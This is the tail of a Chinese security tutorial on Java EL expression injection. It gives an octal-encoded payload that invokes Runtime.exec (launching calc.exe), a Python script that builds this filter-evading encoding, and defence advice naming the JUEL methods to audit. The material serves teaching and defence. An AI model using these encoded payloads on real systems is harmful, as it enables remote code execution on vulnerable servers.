\44\173\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\145\170\145\143\47\54\47\47\56\147\145\164\103\154\141\163\163\50\51\51\56\151\156\166\157\153\145\50\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\147\145\164\122\165\156\164\151\155\145\47\51\56\151\156\166\157\153\145\50\156\165\154\154\51\54\47\143\141\154\143\56\145\170\145\47\51\175
```

脚本：

```python
str = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}"
result = ""
for s in str:
  num = "\\" + oct(ord(s))
  result += num
print(result.replace("\\0", "\\"))
```

## 防御方法

- 尽量不使用外部输入的内容作为 EL 表达式内容；
- 若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；
- 如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：

```java
javax.el.ExpressionFactory.createValueExpression()
javax.el.ValueExpression.getValue()
```



















































